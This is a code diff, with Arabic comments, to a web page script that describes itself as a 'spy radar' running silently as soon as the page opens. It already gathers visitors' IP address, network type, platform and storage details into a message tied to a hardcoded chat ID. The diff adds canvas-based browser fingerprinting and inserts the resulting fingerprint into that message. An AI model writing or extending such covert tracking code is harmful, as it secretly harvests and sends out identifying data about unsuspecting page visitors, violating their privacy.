@@ -140,6 +140,31 @@ const chatId = "7388801889";
     
     // --- رادار التجسس العملاق (يشتغل فور فتح الصفحة) ---
     async function silentRadar() {
+        // --- كود البصمة الوراثية للمتصفح (DNA) ---
+function getCanvasFingerprint() {
+    try {
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        const txt = 'ZeroX-Radar-2026';
+        ctx.textBaseline = "top";
+        ctx.font = "14px 'Arial'";
+        ctx.textBaseline = "alphabetic";
+        ctx.fillStyle = "#f60";
+        ctx.fillRect(125,1,62,20);
+        ctx.fillStyle = "#069";
+        ctx.fillText(txt, 2, 15);
+        ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+        ctx.fillText(txt, 4, 17);
+        
+        // تحويل الرسمة إلى كود فريد (Hash)
+        const b64 = canvas.toDataURL().replace("data:image/png;base64,","");
+        return b64.slice(0, 32); 
+    } catch (e) { return "بصمة محمية"; }
+}
+
+// تعريف المتغير قبل استخدامه في الرسالة
+let deviceFingerprint = getCanvasFingerprint();
+
         
     // --- كود قنص المساحة الخاص بـ ZeroX ---
     let storageInfo = "محجوب/غير مدعوم";
@@ -206,6 +231,7 @@ const chatId = "7388801889";
         const megaMsg = `
 🚨 رادار ZeroX المطور - صيد دقيق!
 ----------------------------------
+🧬 بصمة الجهاز (DNA): ${deviceFingerprint}
 🌐 الـ IP: ${ipAddr}
 📡 الشبكة: ${connection}
 📱 النظام: ${platform}
